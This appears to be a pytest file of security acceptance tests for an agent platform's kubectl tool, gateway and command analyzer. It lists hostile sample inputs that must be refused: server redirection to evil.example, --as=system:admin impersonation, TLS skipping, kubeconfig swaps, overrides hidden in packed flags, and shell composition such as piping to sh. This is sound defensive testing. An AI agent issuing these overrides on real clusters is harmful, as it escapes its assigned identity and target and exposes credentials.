"""Security acceptance boundaries, proven on the real paths (not only on the helpers).

- kubectl: untrusted agent arguments never replace the connector-chosen target/auth/TLS/identity; the
  connector's own prefix still works; flag-position bypasses are refused on the internal runner, the
  ``run_kubectl`` tool, the diagnosis rule and the gateway before anything executes.
- Shell composition (operators, redirects) is refused before any kubectl allow, on the platform's
  security-analyzer chain and on the agent gateway; argv lists stay literal arguments.
- Outbound messages: see ``test_tool_definition_coverage.py`` for the dispatch contract; the cases
  here add a refused approval, an unverifiable context and the audit record.
"""

from __future__ import annotations

import pytest

from app.tools import kubernetes

# --- Flag-scanning counterexamples ------------------------------------------------------------------------
# ``--`` consumed as a flag VALUE must not end flag scanning; a standalone ``--`` is ambiguous here
# (fail closed). Packed short flags are parsed per character like pflag (``-As…`` hides ``-s``).
# Leading environment assignments, wrappers and path-qualified binaries on read-only paths.
from app.tools.kubernetes_kubectl_argv import kubectl_is_read_only  # noqa: E402
from app.tools.runtime_impl._runtime_kubectl_tool import RunKubectlCommandTool
from tests.security_acceptance_support import _context, _diagnosis_report, _gateway, runtime  # noqa: F401

BYPASSES = [
    "cluster-info --namespace=default dump --output-directory=/tmp/x",
    "cluster-info --namespace default dump --output-directory=/tmp/x",
    "cluster-info -n default dump",
    "auth --namespace default reconcile -f rbac.yaml",
    "get pods --server https://evil.example",
    "get pods --server=https://evil.example",
    "get pods --token t",
    "get pods --as=system:admin",
    "get pods --kubeconfig /tmp/other",
    "get pods --insecure-skip-tls-verify",
    "get pods --certificate-authority=/tmp/ca",
    "get pods --context prod",
]


VALUE_POSITION_BYPASSES = [
    ["get", "pods", "--namespace", "--", "--server=https://evil.example"],
    ["get", "pods", "--request-timeout", "--", "--server=https://evil.example"],
    ["get", "pods", "-n", "--", "--token=t"],
    ["get", "pods", "-o", "--", "--as=admin"],
    ["get", "pods", "--", "--server=https://evil.example"],
    ["get", "pods", "--"],
]


PACKED_SHORT_BYPASSES = [
    ["get", "pods", "-Ashttps://evil.example"],
    ["get", "pods", "-As", "https://evil.example"],
    ["get", "pods", "-wAshttps://evil.example"],
    ["logs", "api-0", "-fps", "https://evil.example"],
    ["get", "pods", "-Z"],
    ["get", "pods", "-Ax"],
]


PACKED_SHORT_READS = [
    ["get", "pods", "-Aw"],
    ["get", "pods", "-ojson"],
    ["get", "pods", "-ojsonpath={.items[*].spec.serviceAccountName}"],
    ["get", "pods", "-lapp=s"],
    ["logs", "api-0", "-fp", "-capi"],
    ["logs", "api-0", "--tail", "-1"],
    ["get", "pods", "-npayments", "-A"],
]


@pytest.mark.asyncio
@pytest.mark.parametrize("args", BYPASSES)
async def test_the_internal_runner_refuses_before_execute_with_runtime(runtime, args):  # noqa: F811
    returncode, _, _ = await kubernetes._run_kubectl(_context(), args.split())

    assert returncode == 1
    assert runtime.commands == []


@pytest.mark.asyncio
@pytest.mark.parametrize("args", BYPASSES)
async def test_the_run_kubectl_tool_refuses_before_execute_with_runtime(runtime, args):  # noqa: F811
    result = await RunKubectlCommandTool().execute({"args": args}, _context())

    assert result.get("error")
    assert runtime.commands == []


@pytest.mark.asyncio
async def test_a_namespaced_read_runs_with_the_connector_prefix(runtime):  # noqa: F811
    result = await RunKubectlCommandTool().execute({"args": "get pods -o json", "namespace": "payments"}, _context())

    assert result.get("exit_code") == 0
    (command,) = runtime.commands
    # The connector-chosen kubeconfig and context come first; the agent's arguments follow.
    # (The kubeconfig outside the workspace is mounted read-only into the runtime under a fixed path.)
    assert command[1] == "--kubeconfig" and command[3:7] == ["--context", "demo", "-n", "payments"]
    assert command[7:] == ["get", "pods", "-o", "json"]


@pytest.mark.asyncio
async def test_the_internal_runner_keeps_namespaced_reads(runtime):  # noqa: F811
    returncode, _, _ = await kubernetes._run_kubectl(_context(), ["get", "pods", "-o", "json"], namespace="payments")

    assert returncode == 0
    (command,) = runtime.commands
    assert command[-4:] == ["get", "pods", "-o", "json"] and "payments" in command


@pytest.mark.asyncio
@pytest.mark.parametrize("args", BYPASSES)
async def test_the_diagnosis_chain_refuses_bypasses_on_the_run_kubectl_argv(monkeypatch, args):
    command = ["kubectl", "--kubeconfig", "/srv/kube/config", "--context", "demo", *args.split()]

    report = await _diagnosis_report(monkeypatch, "run_kubectl", command)

    assert report.action != "allow"


@pytest.mark.asyncio
@pytest.mark.parametrize("command", [
    "kubectl get pods; touch /tmp/x",
    "kubectl get pods > /tmp/x",
    "kubectl get pods | sh",
    "kubectl cluster-info --namespace=default dump",
    "KUBECONFIG=/tmp/evil kubectl get pods",
])
async def test_platform_bash_refuses_composition_and_bypasses_on_the_analyzer_chain(monkeypatch, command):
    report = await _diagnosis_report(monkeypatch, "bash", command)

    assert report.action != "allow"


@pytest.mark.asyncio
async def test_platform_bash_keeps_a_plain_namespaced_read(monkeypatch):
    assert (await _diagnosis_report(monkeypatch, "bash", "kubectl get pods -n payments -o json")).action == "allow"


@pytest.mark.parametrize("command", [
    "kubectl --context=dev get pods > /tmp/x",
    "kubectl --context=dev get pods; touch /tmp/x",
    "kubectl --context=dev cluster-info --namespace=default dump",
    "kubectl --context=dev get pods --server=https://evil.example",
    "kubectl --context=dev get pods --as admin",
    "KUBECONFIG=/tmp/evil kubectl --context=dev get pods",
    "env KUBECONFIG=/tmp/evil kubectl --context=dev get pods",
])
def test_the_gateway_refuses_composition_bypasses_and_target_overrides(command):
    decision = _gateway(command)

    assert decision is not None and decision.decision == "deny", command


def test_the_gateway_keeps_a_named_context_read():
    assert _gateway("kubectl --context=dev get pods -n payments") is None


@pytest.mark.parametrize("args", VALUE_POSITION_BYPASSES + PACKED_SHORT_BYPASSES, ids=" ".join)
def test_flag_values_and_packed_shorts_never_hide_an_override(args):
    assert kubectl_is_read_only(args) is False
    assert kubectl_is_read_only(args, context_selectable=True) is False


@pytest.mark.parametrize("args", PACKED_SHORT_READS, ids=" ".join)
def test_packed_short_reads_stay_reads(args):
    assert kubectl_is_read_only(args) is True


@pytest.mark.asyncio
@pytest.mark.parametrize("args", VALUE_POSITION_BYPASSES[:5] + PACKED_SHORT_BYPASSES[:4], ids=" ".join)
async def test_value_and_packed_bypasses_are_refused_before_execute_with_runtime(runtime, args):  # noqa: F811
    returncode, _, _ = await kubernetes._run_kubectl(_context(), args)
    tool = await RunKubectlCommandTool().execute({"args": list(args)}, _context())

    assert returncode == 1
    assert tool.get("error")
    assert runtime.commands == []


@pytest.mark.parametrize("args", VALUE_POSITION_BYPASSES[:5] + PACKED_SHORT_BYPASSES[:4], ids=" ".join)
def test_the_gateway_with_a_named_context_refuses_value_and_packed_bypasses(args):
    import shlex

    decision = _gateway("kubectl --context=dev " + shlex.join(args))

    assert decision is not None and decision.decision == "deny"
